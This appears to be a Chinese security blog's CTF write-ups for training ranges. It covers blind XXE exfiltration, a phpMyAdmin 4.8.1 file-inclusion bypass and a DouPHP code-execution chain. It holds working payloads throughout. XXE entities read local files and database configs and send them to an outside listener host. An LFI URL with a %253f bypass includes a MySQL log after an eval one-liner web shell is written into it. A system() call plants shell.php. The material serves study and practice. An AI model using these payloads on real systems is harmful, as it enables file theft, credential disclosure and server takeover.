<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">xml</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"file:///C:/1.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">xxe</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">xxe</span>&gt;</span></span><br></pre></td></tr></table></figure></div>

<p><strong>发包访问我C盘目录中1.txt文件</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819143850362.png" alt="image-20210819143850362"></p>
</blockquote>
<p>方法二：通过DTD文档引入外部DTD文档，再引入外部实体声明，由于普通的引入外部实体声明就不说了，直接说如果不回显怎么办</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819144644467.png" alt="image-20210819144644467"></p>
</blockquote>
<p>当我们本地将php代码中的回显给关了，那我们怎么获取当前电脑的c:/1.txt文件呢？很简单，直接在公网域名上构造第一个php文件<code>x.php</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$content &#x3D; $_GET[&#39;1&#39;];</span><br><span class="line">if(isset($content))&#123;</span><br><span class="line">    file_put_contents(&#39;flag.txt&#39;,&#39;更新时间:&#39;.date(&quot;Y-m-d H:i:s&quot;).&quot;\n&quot;.$content);</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &#39;no data input&#39;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>和第二个<code>xxe.xml</code>的外部实体文档</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &#39;http:&#x2F;&#x2F;127.0.0.1&#x2F;xml&#x2F;x.php?1&#x3D;%file;&#39;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819145202712.png" alt="image-20210819145202712"></p>
</blockquote>
<p>接着构造一个payload</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="XML"><figure class="iseeu highlight /xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0"?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">ANY</span>[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"php://filter/read=convert.base64-encode/resource=c:/1.txt"</span>&gt;</span></span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="meta-keyword">remote</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">"http://127.0.0.1/xml/xxe.xml"</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">%send;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br></pre></td></tr></table></figure></div>

<p>post传参发包，发现生成了一个flag.txt</p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819145349842.png" alt="image-20210819145349842"></p>
<p>接着我们就得到1.txt的base64的形式，解码一下,就可以得到其中的内容</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819145619095.png" alt="image-20210819145619095"></p>
</blockquote>
<p>支持的协议有哪些？</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819145646289.png" alt="image-20210819145646289"></p>
</blockquote>
<p>具体的根据情况会产生的危害：</p>
<p>1、读取任意文件</p>
<p>2、执行系统命令（expect需要扩展支持）</p>
<p>3、探测内网端口（利用http访问）</p>
<p>4、攻击内网网站等</p>
<h1 id="XXE-1"><a href="#XXE-1" class="headerlink" title="XXE-1"></a>XXE-1</h1><blockquote>
<p>通过上面，我们已经充分了解了XXE的基础知识，直接进入实战环节</p>
<p><strong>实验环境：<a href="http://59.63.200.79:8014/xxe/index.php" target="_blank" rel="noopener">http://59.63.200.79:8014/xxe/index.php</a></strong></p>
</blockquote>
<p>打开靶场看到一个有xxe注入的点</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">$postObj &#x3D; simplexml_load_string($postStr, &#39;SimpleXMLElement&#39;, LIBXML_NOCDATA);</span><br></pre></td></tr></table></figure></div>

<p>而$postStr是由post传参的内容所控制，所以这里存在XXE漏洞</p>
<p>最底下爆出了绝对路径</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819150834903.png" alt="image-20210819150834903"></p>
</blockquote>
<p>这题目标很明确了，由于攻击没有回显，在公网的某个服务器中放入我们刚刚的<code>x.php</code>和<code>xxe.xml</code></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819150949128.png" alt="image-20210819150949128"></p>
</blockquote>
<p>接着利用绝对路径可以读取flag，payload</p>
<blockquote>
<p>若是你没有公网vps服务器的话，这里有两个挂在公网上的可以试用</p>
<p><a href="http://59.63.200.79:8017/1.xml" target="_blank" rel="noopener">http://59.63.200.79:8017/1.xml</a></p>
<p><a href="http://59.63.200.79:8017/3.txt" target="_blank" rel="noopener">http://59.63.200.79:8017/3.txt</a></p>
<p>访问上面那个一样可以</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;c:&#x2F;phpStudy&#x2F;WWW&#x2F;xxe&#x2F;flag.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;59.63.200.79:8017&#x2F;1.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819151333317.png" alt="image-20210819151333317"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819151408189.png" alt="image-20210819151408189"></p>
</blockquote>
<p><strong>base64解码一下就是flag了</strong></p>
<h1 id="XXE-2"><a href="#XXE-2" class="headerlink" title="XXE-2"></a>XXE-2</h1><blockquote>
<p><strong>实验环境：<a href="http://59.63.200.79:8207/" target="_blank" rel="noopener">http://59.63.200.79:8207/</a></strong></p>
</blockquote>
<p>打开一看是个网站，看一下源码发现是闪灵CMS建站</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819151649693.png" alt="image-20210819151649693"></p>
</blockquote>
<p>下载源码找关键函数simplexml_load_string，这个容易出现xxe</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819153630727.png" alt="image-20210819153630727"></p>
</blockquote>
<p>分析</p>
<p><strong>1、<code>$postArr</code>是php://input直接接受post传参的。php://input可以读取没有处理过的POST数据，相较于$HTTP_RAW_POST_DATA而言，它给内存带来的压力较小，并且不需要特殊的php.ini设置，php://input不能用于enctype=multipart/form-data。明显存在XXE</strong></p>
<p><strong>2、想让if满足条件，<code>$signature</code>不为空，<code>$echostr</code>要为空，追踪发现signature和echostr都是GET传参</strong></p>
<p><strong>3、漏洞位置在weixin/index.php,可以通过源码知道存在/conn/conn.php的文件，里面包含着数据库文件</strong></p>
<p>知道了地点了，测试了下是windows系统，访问一下<code>c:/windows/win.ini</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span>xml version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM <span class="string">"php://filter/read=convert.base64-encode/resource=c:/windows/win.ini"</span>&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM <span class="string">"http://59.63.200.79:8017/1.xml"</span>&gt;</span><br><span class="line">%remote;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819154854594.png" alt="image-20210819154854594"></p>
</blockquote>
<p>可以直接利用爆出的路径读取conn/conn.php</p>
<p>payload如下</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;C:&#x2F;phpStudy&#x2F;scms&#x2F;conn&#x2F;conn.php&quot;&gt;</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;59.63.200.79:8017&#x2F;1.xml&quot;&gt;</span><br><span class="line">%remote;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819154957834.png" alt="image-20210819154957834"></p>
</blockquote>
<p>你们访问<a href="http://59.63.200.79:8017/3.txt应该就可以看到" target="_blank" rel="noopener">http://59.63.200.79:8017/3.txt应该就可以看到</a></p>
<p>接着解码看看，数据库的全部数据都出来了，可以直接</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819155118177.png" alt="image-20210819155118177"></p>
</blockquote>
<p><strong>根据源码可以找到adminer.php是连接数据库的后台<a href="http://59.63.200.79:8207/adminer.php" target="_blank" rel="noopener">http://59.63.200.79:8207/adminer.php</a></strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819155359567.png" alt="image-20210819155359567"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819155533478.png" alt="image-20210819155533478"></p>
</blockquote>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819160022233.png" alt="image-20210819160022233"></p>
</blockquote>
<p>但是很奇怪的是，这个数据库居然在linux系统里面，所以登陆不了管理员后台</p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210819160236364.png" alt="image-20210819160236364"></p>
</blockquote>
<p>日志和UDF都撸不了，没权限开读文件功能。</p>
<h1 id="我的个人博客"><a href="#我的个人博客" class="headerlink" title="我的个人博客"></a>我的个人博客</h1><blockquote>
<h2 id="孤桜懶契：http-gylq-gitee-io"><a href="#孤桜懶契：http-gylq-gitee-io" class="headerlink" title="孤桜懶契：http://gylq.gitee.io"></a>孤桜懶契：<a href="http://gylq.gitee.io">http://gylq.gitee.io</a></h2></blockquote>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>黑客工具</tag>
        <tag>封神台</tag>
        <tag>XXE</tag>
      </tags>
  </entry>
  <entry>
    <title>【封神台】漏洞挖掘与代码审计 wp</title>
    <url>/posts/103.html</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<ul>
<li>掌控安全里面的靶场漏洞挖掘与代码审计，练练手！</li>
</ul>
</blockquote>
<h1 id="本地包含漏洞审计"><a href="#本地包含漏洞审计" class="headerlink" title="本地包含漏洞审计"></a>本地包含漏洞审计</h1><blockquote>
<ul>
<li><strong>环境 ：<a href="http://wjbh522a.zs.aqlab.cn/" target="_blank" rel="noopener">http://wjbh522a.zs.aqlab.cn/</a></strong></li>
<li>默认弱密码登陆 admin admin</li>
</ul>
</blockquote>
<p><strong>登陆之后发现是个4.8.1的版本，其实这题做的方法太多了，也可以不用代码审计，网上有一堆payload远程文件包含，不过这个靶场说下源代码审计，那就看看。</strong></p>
<ul>
<li><p>下载源码：<a href="https://www.phpmyadmin.net/files/4.8.1/" target="_blank" rel="noopener">https://www.phpmyadmin.net/files/4.8.1/</a></p>
</li>
<li><p>因为提示说了文件包含，直接全局搜索include</p>
</li>
</ul>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812113644751.png" alt="image-20210812113644751"></p>
</blockquote>
<p><strong>分析了一下代码，想要文件包含的条件</strong></p>
<p><strong>1、<code>target传参不为空</code></strong></p>
<p><strong>2、<code>是字符串</code></strong></p>
<p><strong>3、 <code>参数开头不为index</code></strong></p>
<p><strong>4、<code>target传参内容不在blacklist中</code></strong></p>
<p><strong>5、<code>checkPageValidity返回值为true</code></strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'import.php'</span>, <span class="string">'export.php'</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we have a valid target, let's load that script instead</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">'/^index/'</span>, $_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">'target'</span>], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">'target'</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>定位一下<strong>checkPageValidity</strong>方法</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span><span class="params">(&amp;$page, array $whitelist = [], $include = false)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">           $whitelist = <span class="keyword">self</span>::$goto_whitelist;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">if</span> ($include) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $_page = mb_substr(</span><br><span class="line">           $page,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">       );</span><br><span class="line">       <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       $_page = urldecode($page);</span><br><span class="line">       $_page = mb_substr(</span><br><span class="line">           $_page,</span><br><span class="line">           <span class="number">0</span>,</span><br><span class="line">           mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">       );</span><br><span class="line">       <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>分析一下,这个函数只有返回true我们才能命令执行</strong></p>
<p><strong>1、传参在白名单内返回true</strong></p>
<p><strong>2、给传参末尾加一个？，并且截取？前面的传参，如果传参在白名单内就返回true</strong></p>
<p><strong>3、对传参进行url解码，然后再检测是否在白名单内，在就返回true</strong></p>
<p><code>因此我们可以对?二次url编码%253f来绕过两次检测返回true</code></p>
<p>4、$whitelist如果为空的话，就会返回$goto_whitelist</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">public static $goto_whitelist &#x3D; array(</span><br><span class="line">       &#39;db_datadict.php&#39;,</span><br><span class="line">       &#39;db_sql.php&#39;,</span><br><span class="line">       &#39;db_events.php&#39;,</span><br><span class="line">       &#39;db_export.php&#39;,</span><br><span class="line">       &#39;db_importdocsql.php&#39;,</span><br><span class="line">       &#39;db_multi_table_query.php&#39;,</span><br><span class="line">       &#39;db_qbe.php&#39;,</span><br><span class="line">       &#39;db_structure.php&#39;,</span><br><span class="line">       &#39;db_import.php&#39;,</span><br><span class="line">       &#39;db_operations.php&#39;,</span><br><span class="line">       &#39;db_search.php&#39;,</span><br><span class="line">       &#39;db_routines.php&#39;,</span><br><span class="line">       &#39;export.php&#39;,</span><br><span class="line">       &#39;import.php&#39;,</span><br><span class="line">       &#39;index.php&#39;,</span><br><span class="line">       &#39;pdf_pages.php&#39;,</span><br><span class="line">       &#39;pdf_schema.php&#39;,</span><br><span class="line">       &#39;server_binlog.php&#39;,</span><br><span class="line">       &#39;server_collations.php&#39;,</span><br><span class="line">       &#39;server_databases.php&#39;,</span><br><span class="line">       &#39;server_engines.php&#39;,</span><br><span class="line">       &#39;server_export.php&#39;,</span><br><span class="line">       &#39;server_import.php&#39;,</span><br><span class="line">       &#39;server_privileges.php&#39;,</span><br><span class="line">       &#39;server_sql.php&#39;,</span><br><span class="line">       &#39;server_status.php&#39;,</span><br><span class="line">       &#39;server_status_advisor.php&#39;,</span><br><span class="line">       &#39;server_status_monitor.php&#39;,</span><br><span class="line">       &#39;server_status_queries.php&#39;,</span><br><span class="line">       &#39;server_status_variables.php&#39;,</span><br><span class="line">       &#39;server_variables.php&#39;,</span><br><span class="line">       &#39;sql.php&#39;,</span><br><span class="line">       &#39;tbl_addfield.php&#39;,</span><br><span class="line">       &#39;tbl_change.php&#39;,</span><br><span class="line">       &#39;tbl_create.php&#39;,</span><br><span class="line">       &#39;tbl_import.php&#39;,</span><br><span class="line">       &#39;tbl_indexes.php&#39;,</span><br><span class="line">       &#39;tbl_sql.php&#39;,</span><br><span class="line">       &#39;tbl_export.php&#39;,</span><br><span class="line">       &#39;tbl_operations.php&#39;,</span><br><span class="line">       &#39;tbl_structure.php&#39;,</span><br><span class="line">       &#39;tbl_relation.php&#39;,</span><br><span class="line">       &#39;tbl_replace.php&#39;,</span><br><span class="line">       &#39;tbl_row_action.php&#39;,</span><br><span class="line">       &#39;tbl_select.php&#39;,</span><br><span class="line">       &#39;tbl_zoom_select.php&#39;,</span><br><span class="line">       &#39;transformation_overview.php&#39;,</span><br><span class="line">       &#39;transformation_wrapper.php&#39;,</span><br><span class="line">       &#39;user_password.php&#39;,</span><br><span class="line">   );</span><br></pre></td></tr></table></figure></div>

<p>就拿数组中第一个<strong>db_datadict.php</strong>来绕过</p>
<p><strong>本地测试</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812125644888.png" alt="image-20210812125644888"></p>
</blockquote>
<p><strong>payload</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;log.txt</span><br></pre></td></tr></table></figure></div>

<p><strong>我们直接去靶场尝试一下，首先将日志打开，待会包含日志</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812125810585.png" alt="image-20210812125810585"></p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;wjbh522a.zs.aqlab.cn&#x2F;index.php?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;phpStudy&#x2F;MySQL&#x2F;data&#x2F;WIN-FOIHHTO5ZS1.log</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812130056487.png" alt="image-20210812130056487"></p>
</blockquote>
<p><strong>直接写一句话木马往日志里面写</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SQL"><figure class="iseeu highlight /sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="string">"&lt;?php eval($_REQUEST[1]);?&gt;"</span></span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812130215105.png" alt="image-20210812130215105"></p>
</blockquote>
<p><strong>接着日志里面就会有我们一句话木马</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;wjbh522a.zs.aqlab.cn&#x2F;index.php?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;phpStudy&#x2F;MySQL&#x2F;data&#x2F;WIN-FOIHHTO5ZS1.log&amp;1&#x3D;phpinfo();</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812130313055.png" alt="image-20210812130313055"></p>
</blockquote>
<p><strong>然后利用命令执行写一个<code>shell.php</code>到当前网站的目录</strong>，当然也可以利用<code>file_put_contents(&#39;shell.php&#39;,&#39;&lt;?php eval($_REQUEST[1])?&gt;&#39;);</code>来写shell不过我习惯命令执行写了。</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;wjbh522a.zs.aqlab.cn&#x2F;index.php?target&#x3D;db_datadict.php%253f&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;phpStudy&#x2F;MySQL&#x2F;data&#x2F;WIN-FOIHHTO5ZS1.log&amp;1&#x3D;system(&#39;echo &quot;&lt;?php eval($_REQUEST[1]);?&gt;&quot; &gt;&gt; shell.php&#39;);</span><br></pre></td></tr></table></figure></div>

<p><strong>接着就拿shell了</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812130524845.png" alt="image-20210812130524845"></p>
<p><strong>蚁剑连接拿flag</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812130829354.png" alt="image-20210812130829354"></p>
</blockquote>
<h1 id="代码执行漏洞审计"><a href="#代码执行漏洞审计" class="headerlink" title="代码执行漏洞审计"></a>代码执行漏洞审计</h1><blockquote>
<p><strong>先了解一下代码执行的一些基础知识</strong></p>
</blockquote>
<p><strong>代码执行漏洞的核心在与将用户输入的数据当作后端代码进行执行。后端代码有php，asp，aspx，java等。以php为例，当存在一些高危函数时，可能存在代码执行漏洞。如：eval()，assert()，preg_replace()，array_map()，双引号命令执行等。当执行代码审计时，可通过敏感函数定位法，定位代码中的高危函数，较为便捷得查看是否存在代码执行漏洞。</strong></p>
<p>函数的解释：</p>
<p><strong>1、 eval（）执行多行代码</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812131750405.png" alt="image-20210812131750405"></p>
</blockquote>
<p><strong>2、 assert（）执行单行代码</strong> </p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812131933007.png" alt="image-20210812131933007"></p>
</blockquote>
<p>3、<strong>preg_replace() 正则替换/e的修饰符，替换必须真实发生才会触发函数，不发生替换，不会触发</strong>，不过有版本限制。</p>
<p>4、<strong>双引号命令执行：PHP5.5以上可以用<code>&quot;${phpinfo()}&quot;</code></strong>php字符串的高级用法</p>
<blockquote>
<ul>
<li><strong>靶场环境：<a href="http://dm521zx.zs.aqlab.cn/" target="_blank" rel="noopener">http://dm521zx.zs.aqlab.cn/</a></strong></li>
<li><strong>弱密码：admin 123456登陆后台</strong> 后台路径扫一下就出来了</li>
</ul>
</blockquote>
<p>进入后台之后，发现是一个cms，<strong>DouPHP版本：v1.5 Release 20190711</strong>，去百度上查一下源码<a href="https://www.douphp.com/history" target="_blank" rel="noopener">https://www.douphp.com/history</a></p>
<p><strong>本地安装Douphp之后，我们可以发现无法重新安装，因为被锁住了</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812141637343.png" alt="image-20210812141637343"></p>
<p><strong>在/upload/data/install.lock这个锁使我们无法重新安装</strong></p>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812141724199.png" alt="image-20210812141724199"></p>
<p><strong>我们在data中的config.php中发现我们刚刚安装时填写的数据库账号和密码，这是个php文件，我们如果在安装时写入一句话木马，不就getshell了吗。思路出来就想办法删install.lock</strong></p>
<p><strong>先测试是否可以getshell，先本地删除install.lock，直接利用双引号命令执行来直接getshell</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812144130449.png" alt="image-20210812144130449"></p>
</blockquote>
<p><strong>接着打开data/config.php</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812144430855.png" alt="image-20210812144430855"></p>
</blockquote>
<p><strong>看看源码有没有办法删锁文件</strong></p>
<p><strong>unlink（）删除文件函数。相对路径和绝对路径都可以，全局搜索一下unlink</strong></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812154452909.png" alt="image-20210812154452909"></p>
</blockquote>
<p><strong>查看一下代码</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$mobile_logo = $dou-&gt;get_one(<span class="string">"SELECT value FROM "</span> . $dou-&gt;table(<span class="string">'config'</span>) . <span class="string">" WHERE name = 'mobile_logo'"</span>);</span><br><span class="line">        @ unlink(ROOT_PATH . M_PATH . <span class="string">'/theme/'</span> . $_CFG[<span class="string">'mobile_theme'</span>] . <span class="string">'/images/'</span> . $mobile_logo);</span><br></pre></td></tr></table></figure></div>

<p><strong>追踪一下mobile_logo，发现mobile_logo可由post传参控制，</strong></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">$mobile_logo = $file-&gt;upload(<span class="string">'mobile_logo'</span>, <span class="string">'logo'</span>); <span class="comment">// 上传的文件域</span></span><br><span class="line">           $_POST[<span class="string">'mobile_logo'</span>] = $mobile_logo;</span><br></pre></td></tr></table></figure></div>

<p>打开这个目录<a href="http://dm521zx.zs.aqlab.cn/admin/mobile.php，上传一个文件，然后抓包" target="_blank" rel="noopener">http://dm521zx.zs.aqlab.cn/admin/mobile.php，上传一个文件，然后抓包</a></p>
<blockquote>
<p><img src="https://gylq.gitee.io/cloudimages/img/image-20210812160616330.png" alt="image-20210812160616330"></p>
</blockquote>
